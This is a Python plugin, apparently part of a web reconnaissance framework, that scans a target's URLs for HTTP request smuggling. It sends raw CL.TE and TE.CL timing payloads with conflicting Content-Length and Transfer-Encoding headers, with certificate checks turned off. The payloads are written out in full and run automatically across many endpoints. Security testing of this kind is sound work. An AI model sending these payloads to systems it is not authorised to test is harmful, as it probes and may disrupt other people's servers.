#!/usr/bin/env python3
"""
HTTP Request Smuggling Scanner (CL.TE & TE.CL)
Detects Desync vulnerabilities via timing analysis using raw sockets.
"""
import json
import socket
import ssl
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import throttle
from core.config import DEFAULT_USER_AGENT

TIMEOUT = 10

def raw_request(host, port, is_https, payload, timeout=TIMEOUT):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    start_time = time.time()
    resp_text = ""
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            if is_https:
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.sendall(payload.encode())
            try:
                resp = b""
                # Read at least HTTP headers to confirm response
                while b"\r\n\r\n" not in resp:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                resp_text = resp.decode(errors="ignore")
            except socket.timeout:
                pass # Timeout during read is what we are looking for!
    except Exception as e:
        return -1, str(e)
    
    elapsed = time.time() - start_time
    return elapsed, resp_text

def test_smuggling(url):
    throttle()
    parsed = urlparse(url)
    host = parsed.netloc
    if ':' in host:
        host, port = host.split(':', 1)
        port = int(port)
    else:
        port = 443 if parsed.scheme == "https" else 80
    
    is_https = parsed.scheme == "https"
    path = parsed.path or "/"

    findings = []

    # Safe Baseline Request
    baseline_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
        "Connection: close\r\n"
        "Content-Length: 0\r\n\r\n"
    )
    baseline_time, resp = raw_request(host, port, is_https, baseline_payload, timeout=5)
    if baseline_time == -1 or baseline_time > 4:
        return [] # Server too slow to reliably test timing

    # V10.4: Threshold dinâmico baseado no baseline (mínimo 3s)
    timing_threshold = max(baseline_time * 3, 3.0)

    # 1. CL.TE Timeout Payload
    cl_te_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "Z\r\n"
        "Q\r\n"
        "\r\n"
    )

    clte_time, clte_resp = raw_request(host, port, is_https, cl_te_payload, timeout=TIMEOUT)
    if clte_time > (baseline_time + timing_threshold) and ("500" not in clte_resp and "400" not in clte_resp):
        findings.append({
            "url": url,
            "type": "CL.TE Smuggling",
            "risk": "HIGH",
            "details": f"Possível CL.TE vulnerability (delay de {clte_time:.2f}s vs {baseline_time:.2f}s base, threshold: {timing_threshold:.2f}s).",
            "payload": cl_te_payload
        })

    # 2. TE.CL Timeout Payload
    te_cl_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )

    tecl_time, tecl_resp = raw_request(host, port, is_https, te_cl_payload, timeout=TIMEOUT)
    if tecl_time > (baseline_time + timing_threshold) and ("500" not in tecl_resp and "400" not in tecl_resp):
        findings.append({
            "url": url,
            "type": "TE.CL Smuggling",
            "risk": "HIGH",
            "details": f"Possível TE.CL vulnerability (delay de {tecl_time:.2f}s vs {baseline_time:.2f}s base, threshold: {timing_threshold:.2f}s).",
            "payload": te_cl_payload
        })

    return findings

def run(context: dict):
    target = context.get("target")
    if not target: raise ValueError("Target required")

    info(
        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
        f"   📦  {C.BOLD}{C.CYAN}HTTP REQUEST SMUGGLING SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟪───────────────────────────────────────────────────────────🟪\n"
    )

    outdir = ensure_outdir(target, "http_smuggling")
    results_file = outdir / "smuggling_results.json"
    
    all_urls = []
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    
    if urls_file.exists():
        all_urls = [u.strip() for u in urls_file.read_text().splitlines() if u.strip().startswith('http')]
        
    testable_urls = list(set([f"{urlparse(u).scheme}://{urlparse(u).netloc}/" for u in all_urls]))[:30] # Limit to top 30 base endpoints to prevent extremely long scans
    
    if not testable_urls:
        info("Nenhuma URL encontrada para teste em Smuggling.")
        results_file.write_text("[]")
        return [str(results_file)]

    info(f"   📊 Testando {len(testable_urls)} endpoints base via RAW Sockets (CL.TE / TE.CL)...")
    
    all_findings = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(test_smuggling, url): url for url in testable_urls}
        for future in as_completed(futures):
            try:
                findings = future.result()
                if findings:
                    all_findings.extend(findings)
                    for f in findings:
                        warn(f"   🚨 {C.RED}{f['type']}: {futures[future]}{C.END}")
            except Exception as e:
                pass
                
    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    
    if all_findings:
        success(f"📦 {len(all_findings)} potenciais desyncs encontrados!")
    else:
        success("✅ Nenhum Request Smuggling (Time Delay) detectado.")
        
    return [str(results_file)]
